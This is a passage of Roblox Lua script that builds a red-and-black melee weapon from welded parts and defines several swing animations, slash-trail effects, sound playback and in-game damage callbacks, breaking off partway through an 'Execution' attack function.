Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.81469727e-006, 9.91821289e-005, -6.91413879e-006, 1, 0, 0, 0, 1, 0, 0, 0, 0.999999762))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 0.741254449, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.311326861, 0.200000003, 0.326149136))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.81469727e-006, 1.03784561, -6.91413879e-006, 1, 0, 0, 0, 1, 0, 0, 0, 0.999999762))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 0.741254449, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(1.33425796, 0.296501786, 1.48249602))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.40934753, 3.81469727e-006, -6.91413879e-006, -2.98023224e-008, -0.999999821, -0, 0.999999821, -2.98023224e-008, 0, 0, 0, 0.999999762))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.311326861, 0.200000003, 0.326149136))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.81469727e-006, -1.03752136, -6.91413879e-006, 1, 0, 0, 0, 1, 0, 0, 0, 0.999999762))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 0.741254449, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.326151937, 0.296499252))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.40927505, 2.95639038e-005, 0.444754362, -2.98023295e-008, -1, -0, 1, -2.98023295e-008, 0, 0, 0, 0.999999762))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.326151937, 0.296499252))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.40908051, 0.000387191772, -6.91413879e-006, -2.98023259e-008, -0.999999523, -0, 1, -2.98023402e-008, 0, 0, 0, 0.999999285))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.326151937, 0.296499252))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.96453476, 4.67300415e-005, -6.91413879e-006, -2.98023295e-008, -1, -0, 1, -2.98023295e-008, 0, 0, 0, 0.999999762))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.326151937, 0.296499252))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.40927505, 2.95639038e-005, -0.444758654, -2.98023295e-008, -1, -0, 1, -2.98023295e-008, 0, 0, 0, 0.999999762))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.296501786, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(4.00191879, 0.00050163269, 0.815378904, -2.98023437e-008, -0.999999642, -0, 0.999999642, -2.98023437e-008, 0, 0, 0, 0.999999762))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 1, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.200000003, 0.200000003, 0.444748729))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.45595932, 0.000414848328, 1.25711417, 7.28358245e-008, -0.999999046, 2.98032496e-008, 1, 7.28358458e-008, -1.13780651e-007, 1.13780807e-007, 2.98032212e-008, 0.999998808))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.296501815, 0.296501487, 0.296499223))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.81469727e-006, -2.74229431, -6.67572021e-006, 1, 0, 0, 0, 1, 0, 0, 0, 0.999999523))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.296501815, 0.296501487, 0.296499223))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.81469727e-006, 2.74255371, -6.67572021e-006, 1, 0, 0, 0, 1, 0, 0, 0, 0.999999523))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.296501786, 0.296501786, 0.296499252))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-4.48226929e-005, 2.89077377, -2.43186951e-005, 0.999999642, 1.29942332e-008, 1.07873738e-007, -1.29943079e-008, 0.999999642, 7.15448891e-007, -1.07873717e-007, -7.15448834e-007, 0.999999762))
mesh("SpecialMesh",Part,Enum.MeshType.Sphere,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.296501786, 0.200000003, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.000374794006, -0.963628292, 4.00193787, -0.999993443, -3.16762635e-006, -1.49011381e-008, -1.49021755e-008, 8.47403953e-007, -0.999998868, 3.16762657e-006, -0.999993384, -7.8780505e-007))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 0.741254449, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.296501786, 0.296501786, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.000382423401, -0.88951993, -3.11242676, 0.999993205, 1.42891167e-006, -3.27825433e-007, -4.32134527e-007, 1.02892602e-006, -0.999998927, -1.47361538e-006, 0.999993265, 9.69328653e-007))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.296501786, 0.444752693, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.000383377075, 0.518874645, -3.11242294, -0.999993443, -1.32620335e-006, 2.76574696e-007, 3.95783559e-007, -9.85657607e-007, 0.999998868, -1.37090683e-006, 0.999993265, 9.26059613e-007))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.200000003, 1.48249602))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.60424805, 0.000413894653, 2.51726198, 1.59275899e-007, -0.999999821, 1.49011584e-007, 1, 1.59275913e-007, -1.1378453e-007, 1.1378458e-007, 1.49011612e-007, 0.999999583))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.200000003, 0.593003631, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.000409126282, -2.96186352, -3.45602417, 0.999993205, 5.70906195e-007, 5.16308319e-006, 5.08593212e-006, -2.63005495e-005, -0.999997497, -5.03489844e-007, 0.999994576, -2.12490504e-005))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 1, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.200000003, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.45597839, 0.000414848328, 1.55362201, 1.59275089e-007, -0.999997139, -5.96043996e-008, 1, 1.59274975e-007, -1.13784445e-007, 1.13784942e-007, -5.96045808e-008, 0.999996901))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.200000003, 0.200000003, 0.592998326))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.45598221, 0.000413894653, 2.36899614, 1.59275146e-007, -0.999998569, -2.98022584e-008, 1, 1.59275189e-007, -1.13784601e-007, 1.137849e-007, -2.98023508e-008, 0.999998331))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.200000003, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.45597839, 0.000414848328, 1.99837613, 1.59275089e-007, -0.99999845, -5.96045027e-008, 1, 1.59275174e-007, -1.13784559e-007, 1.13784928e-007, -5.96046306e-008, 0.999998212))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.200000003, 0.200000003, 0.296499103))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.45598602, 0.000414848328, 1.77599883, 1.59275174e-007, -0.999998808, -2.98022726e-008, 1, 1.59275203e-007, -1.13784644e-007, 1.13784857e-007, -2.98023366e-008, 0.999998569))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.889505386, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.000412940979, -3.70311022, -3.60429001, 0.999993205, 5.70906195e-007, 5.16308319e-006, 5.08593212e-006, -2.63005495e-005, -0.999997497, -5.03489844e-007, 0.999994576, -2.12490504e-005))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 1, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.200000003, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.81469727e-006, 1.90172958, -0.639986753, 0.999993563, 1.29944793e-008, 1.07850958e-007, -1.29944917e-008, 0.999992311, 1.25175063e-006, -1.0785029e-007, -1.07292954e-006, 0.999998868))
mesh("SpecialMesh",Part,Enum.MeshType.Sphere,"",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.296501815, 0.593003571, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.81469727e-006, 0.0706977844, -0.573273659, 0.999997854, 1.29939313e-008, 1.07844173e-007, -1.29939162e-008, 0.999997437, 2.38420625e-007, -1.07843974e-007, -1.78815498e-007, 0.999999464))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 0.815372765))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.296501815, 0.200000003, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.81469727e-006, -0.596420288, -0.57327354, 0.999997854, 1.29939313e-008, 1.07844173e-007, -1.29939162e-008, 0.999997437, 2.38420625e-007, -1.07843974e-007, -1.78815498e-007, 0.999999464))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 0.741254449, 0.815372765))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.296501815, 0.741254449, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.81469727e-006, -1.18922043, -0.57327342, 0.999997854, 1.29939313e-008, 1.07844173e-007, -1.29939162e-008, 0.999997437, 2.38420625e-007, -1.07843974e-007, -1.78815498e-007, 0.999999464))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 0.815372765))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.296501815, 0.200000003, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.81469727e-006, 0.737804413, -0.573273778, 0.999997854, 1.29939313e-008, 1.07844173e-007, -1.29939162e-008, 0.999997437, 2.38420625e-007, -1.07843974e-007, -1.78815498e-007, 0.999999464))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 0.741254449, 0.815372765))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.200000003, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(1.62124634e-005, -1.92287064, -0.639983892, 0.999997854, 1.29942155e-008, 1.07847583e-007, -1.29942519e-008, 0.999997437, 7.15275121e-007, -1.07847377e-007, -6.55669055e-007, 0.999999464))
mesh("SpecialMesh",Part,Enum.MeshType.Sphere,"",Vector3.new(0, 0, 0),Vector3.new(0.741254449, 0.741254449, 0.741248071))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really red","Part",Vector3.new(0.296501815, 0.741254449, 0.200000003))
Partweld=weld(m,Handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.81469727e-006, 1.33082199, -0.573274136, 0.999993563, 1.2994124e-008, 1.07846695e-007, -1.29940725e-008, 0.999992311, 6.55663769e-007, -1.07846034e-007, -4.76846481e-007, 0.999998868))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 0.815372765))

function attackone()
        attack=true
con1=Hitbox.Touched:connect(function(hit) Damagefunc(Hitbox,hit,10,30,math.random(10,20),"Normal",RootPart,.2,1) end) 
        for i=0,1,0.1 do
                swait()
RootJoint.C0 = clerp(RootJoint.C0,RootCF*cf(0,0,0)* angles(math.rad(10),math.rad(0),math.rad(80)),.3)
Torso.Neck.C0 = clerp(Torso.Neck.C0,necko *angles(math.rad(-5),math.rad(10),math.rad(-70)),.3)
RW.C0 = clerp(RW.C0, CFrame.new(1.5, 0.5, 0) * angles(math.rad(0), math.rad(90), math.rad(90)), 0.3)
LW.C0 = clerp(LW.C0, CFrame.new(-1.5, 0.5, 0) * angles(math.rad(80), math.rad(-70), math.rad(0)), 0.3)
RH.C0=clerp(RH.C0,cf(1,-1,0.2)*angles(math.rad(0),math.rad(40),math.rad(20)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-60),math.rad(0)),.3)
Handleweld.C0=clerp(Handleweld.C0,cf(0,0,0)*angles(math.rad(0),math.rad(-5),math.rad(0)),.3)
        end
so("http://roblox.com/asset/?id=92597369",Hitbox,1,0.6) 
so("http://roblox.com/asset/?id=231917871",Hitbox,1,0.8) 
 for i=0,1,0.1 do
                swait()
 local blcf = Hitbox.CFrame*CFrame.new(0,.5,0)
if scfr and (Hitbox.Position-scfr.p).magnitude > .1 then
local h = 5
local a,b = Triangle((scfr*CFrame.new(0,h/2,0)).p,(scfr*CFrame.new(0,-h/2,0)).p,(blcf*CFrame.new(0,h/2,0)).p)
if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
local a,b = Triangle((blcf*CFrame.new(0,h/2,0)).p,(blcf*CFrame.new(0,-h/2,0)).p,(scfr*CFrame.new(0,-h/2,0)).p)
if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
scfr = blcf
elseif not scfr then
scfr = blcf
end
RootJoint.C0 = clerp(RootJoint.C0,RootCF*cf(0,0,0)* angles(math.rad(10),math.rad(0),math.rad(-80)),.3)
Torso.Neck.C0 = clerp(Torso.Neck.C0,necko *angles(math.rad(-5),math.rad(5),math.rad(70)),.3)
RW.C0 = clerp(RW.C0, CFrame.new(1.5, 0.5, 0.5) * angles(math.rad(0), math.rad(-70), math.rad(90)), 0.3)
LW.C0 = clerp(LW.C0, CFrame.new(-1.5, 0.5, 0) * angles(math.rad(70), math.rad(-70), math.rad(0)), 0.3)
RH.C0=clerp(RH.C0,cf(1,-1,0.2)*angles(math.rad(0),math.rad(40),math.rad(20)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-60),math.rad(0)),.3)
Handleweld.C0=clerp(Handleweld.C0,cf(0,0,0)*angles(math.rad(0),math.rad(-5),math.rad(0)),.3)
        end
        attack=false
con1:disconnect()
scfr = nil
end

function attacktwo()
        attack=true
con1=Hitbox.Touched:connect(function(hit) Damagefunc(Hitbox,hit,10,30,math.random(10,20),"Normal",RootPart,.2,1) end) 
        for i=0,1,0.1 do
                swait()
RootJoint.C0 = clerp(RootJoint.C0,RootCF*cf(0,0,0)* angles(math.rad(10),math.rad(0),math.rad(90)),.2)
Torso.Neck.C0 = clerp(Torso.Neck.C0,necko *angles(math.rad(5),math.rad(-5),math.rad(-80)),.3)
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(0),math.rad(90),math.rad(90)),.1)
LW.C0 = clerp(LW.C0, CFrame.new(-1.5, 0.5, 0) * angles(math.rad(70), math.rad(-70), math.rad(0)), 0.3)

        end

for i=0,1,1 do
swait()
so("http://roblox.com/asset/?id=92597369",Hitbox,1,0.7) 
so("http://www.roblox.com/asset/?id=234365573",Hitbox,1,0.7)
for i=0,1,0.1 do
swait()
 local blcf = Hitbox.CFrame*CFrame.new(0,.5,0)
if scfr and (Hitbox.Position-scfr.p).magnitude > .1 then
local h = 5
local a,b = Triangle((scfr*CFrame.new(0,h/2,0)).p,(scfr*CFrame.new(0,-h/2,0)).p,(blcf*CFrame.new(0,h/2,0)).p)
if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
local a,b = Triangle((blcf*CFrame.new(0,h/2,0)).p,(blcf*CFrame.new(0,-h/2,0)).p,(scfr*CFrame.new(0,-h/2,0)).p)
if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
scfr = blcf
elseif not scfr then
scfr = blcf
end
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*euler(0,0,-6*i),.3)
Torso.Neck.C0 = clerp(Torso.Neck.C0,necko *angles(math.rad(5),math.rad(-5),math.rad(-50)),.3)
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(0),math.rad(-10),math.rad(90)),.1)
LW.C0 = clerp(LW.C0, CFrame.new(-1.5, 0.5, 0) * angles(math.rad(0), math.rad(0), math.rad(-60)), 0.3)
Handleweld.C0=clerp(Handleweld.C0,cf(0,-0,0)*angles(math.rad(-50),math.rad(0),math.rad(0)),.3)
end
end
con1:disconnect()
attack=false
scfr = nil
end

function attackthree()
        attack=true
con1=Hitbox.Touched:connect(function(hit) Damagefunc(Hitbox,hit,10,30,math.random(10,20),"Normal",RootPart,.2,1) end) 
        for i=0,1,0.1 do
swait()
RootJoint.C0 = clerp(RootJoint.C0,RootCF*cf(0,0,0)* angles(math.rad(-10),math.rad(0),math.rad(00)),.3)
Torso.Neck.C0 = clerp(Torso.Neck.C0,necko *angles(math.rad(5),math.rad(-5),math.rad(00)),.3)
RW.C0=clerp(RW.C0,cf(1,0.8,-1)*angles(math.rad(150),math.rad(0),math.rad(-50)),.3)
LW.C0=clerp(LW.C0,cf(-1,0.8,-1)*angles(math.rad(150),math.rad(0),math.rad(50)),.3)
RH.C0=clerp(RH.C0,cf(1,-1,.2)*angles(math.rad(0),math.rad(90),math.rad(0)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,-.2)*angles(math.rad(0),math.rad(-90),math.rad(0)),.3)
Handleweld.C0=clerp(Handleweld.C0,cf(-1,0,-.2)*angles(math.rad(-20),math.rad(-20),math.rad(50)),.3)
        end
so("http://roblox.com/asset/?id=92597369",Hitbox,1,0.4) 
so("http://www.roblox.com/asset/?id=234365549",Hitbox,1,0.6)
for i=0,1,.1 do
swait()
 local blcf = Hitbox.CFrame*CFrame.new(0,.5,0)
if scfr and (Hitbox.Position-scfr.p).magnitude > .1 then
local h = 5
local a,b = Triangle((scfr*CFrame.new(0,h/2,0)).p,(scfr*CFrame.new(0,-h/2,0)).p,(blcf*CFrame.new(0,h/2,0)).p)
if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
local a,b = Triangle((blcf*CFrame.new(0,h/2,0)).p,(blcf*CFrame.new(0,-h/2,0)).p,(scfr*CFrame.new(0,-h/2,0)).p)
if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
scfr = blcf
elseif not scfr then
scfr = blcf
end
RootJoint.C0 = clerp(RootJoint.C0,RootCF*cf(0,0,0)* angles(math.rad(20),math.rad(0),math.rad(0)),.3)
Torso.Neck.C0 = clerp(Torso.Neck.C0,necko *angles(math.rad(-10),math.rad(-5),math.rad(00)),.3)
RW.C0=clerp(RW.C0,cf(1,0.2,-.5)*angles(math.rad(10),math.rad(0),math.rad(-50)),.3)
LW.C0=clerp(LW.C0,cf(-1,0.2,-.5)*angles(math.rad(10),math.rad(0),math.rad(50)),.3)
RH.C0=clerp(RH.C0,cf(1,-1,.2)*angles(math.rad(0),math.rad(90),math.rad(0)),.3)
LH.C0=clerp(LH.C0,cf(-1,-1,-.2)*angles(math.rad(0),math.rad(-90),math.rad(0)),.3)
Handleweld.C0=clerp(Handleweld.C0,cf(-1,0,-.2)*angles(math.rad(-20),math.rad(-20),math.rad(50)),.3)
        end
attack=false
con1:disconnect()
scfr = nil
end

function CyanMoon()
attack=true
con1=Hitbox.Touched:connect(function(hit) Damagefunc(Hitbox,hit,10,30,math.random(10,20),"Normal",RootPart,.2,1) end) 
for i=0,1,0.1 do
swait()
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(0),math.rad(120),math.rad(80)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(-10),math.rad(0),math.rad(-10)),.3)
Handleweld.C0=clerp(Handleweld.C0,cf(0,0,0)*angles(math.rad(-30),math.rad(-5),math.rad(0)),.3)
end
for i=1,4 do
so("http://roblox.com/asset/?id=92597369",Hitbox,1,0.5) 
so("http://roblox.com/asset/?id=28144425",Torso,1,0.8)
swait()
for i=0,1,0.1 do
swait()
local blcf = Hitbox.CFrame*CFrame.new(0,.5,0)
if scfr and (Hitbox.Position-scfr.p).magnitude > .1 then
local h = 5
local a,b = Triangle((scfr*CFrame.new(0,h/2,0)).p,(scfr*CFrame.new(0,-h/2,0)).p,(blcf*CFrame.new(0,h/2,0)).p)
if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
local a,b = Triangle((blcf*CFrame.new(0,h/2,0)).p,(blcf*CFrame.new(0,-h/2,0)).p,(scfr*CFrame.new(0,-h/2,0)).p)
if a then game.Debris:AddItem(a,1) end if b then game.Debris:AddItem(b,1) end
scfr = blcf
elseif not scfr then
scfr = blcf
end
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*angles(math.rad(0),math.rad(-40),math.rad(90)),.3)
LW.C0=clerp(LW.C0,cf(-1.5,0.5,0)*angles(math.rad(-20),math.rad(0),math.rad(-60)),.3)
RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,5)*euler(0,-1.5,-6*i),.3)
Handleweld.C0=clerp(Handleweld.C0,cf(0,0,0)*angles(math.rad(-30),math.rad(-5),math.rad(0)),.3)
end
end
attack=false
con1:disconnect()
scfr = nil
end

function BreakEffect(brickcolor,cframe,x1,y1,z1)
local prt=part("Custom",workspace,"SmoothPlastic",0,0,"Really red","Effect",vt(0.5,0.5,0.5))
prt.Anchored=true
prt.CFrame=cframe*euler(math.random(-50,50),math.random(-50,50),math.random(-50,50))
local msh=mesh("SpecialMesh",prt,"Sphere","",vt(0,0,0),vt(x1,y1,z1))
coroutine.resume(coroutine.create(function(Part,CF,Numbb,randnumb) 
CF=Part.CFrame
Numbb=0
randnumb=math.random()-math.random()
for i=0,1,0.05 do
wait()
CF=CF*cf(0,1,0)
--Part.CFrame=Part.CFrame*euler(0.5,0,0)*cf(0,1,0)
Part.CFrame=CF*euler(Numbb,0,0)
Part.Transparency=i
Numbb=Numbb+randnumb
end
Part.Parent=nil
end),prt)
end

function Execution() --HEUAHUEHAUEHAUHUEAHUAEHUAHEUAHEUH
attack=true
con1=Hitbox.Touched:connect(function(hit) Damagefunc(Hitbox,hit,90,100,math.random(10,20),"Knockdown",RootPart,.2,1) end) 
for i=0,1,0.03 do
swait()
RootJoint.C0 = clerp(RootJoint.C0,RootCF*cf(0,0,0)* angles(math.rad(0),math.rad(0),math.rad(60)),.1)
Torso.Neck.C0 = clerp(Torso.Neck.C0,necko *angles(math.rad(5),math.rad(0),math.rad(-60)),.1)
RW.C0=clerp(RW.C0,cf(1.5,0.5,0)*euler(math.rad(0),math.rad(90),math.rad(120)),.1)
LW.C0 = clerp(LW.C0, CFrame.new(-1.5, 0.5, 0) * angles(math.rad(100), math.rad(0), math.rad(0)), 0.1)
RH.C0=clerp(RH.C0,cf(1,-1,0)*angles(math.rad(0),math.rad(90),math.rad(-10)),.1)
LH.C0=clerp(LH.C0,cf(-1,-1,0)*angles(math.rad(0),math.rad(-90),math.rad(0)),.2)
Handleweld.C0=clerp(Handleweld.C0,cf(0,-0,.4)*angles(math.rad(0),math.rad(10),math.rad(0)),.1)
end
so("http://roblox.com/asset/?id=92597369",Hitbox,1,0.5) 
so("http://roblox.com/asset/?id=28144425",Torso,1,0.5)
 hitconasdf = Hitbox.Touched:connect(function(hit)
                local hum12 = hit.Parent:FindFirstChild("Humanoid")
                if hum12 and not hum12:IsDescendantOf(Character) then
                        so('http://roblox.com/asset/?id=154965973',Hitbox,1,0.8)
                        for i = 1,20 do
                        BreakEffect(BrickColor.new("Really red"),hit.Parent.Torso.CFrame,0.5,math.random(5,20),0.5)
                        end
                   hitconasdf:disconnect()
                end
        end)
for i=0,1,0.03 do
swait()
local blcf = Hitbox.CFrame*CFrame.new(0,.5,0)
if scfr and (Hitbox.Position-scfr.p).magnitude > .1 then
local h = 5
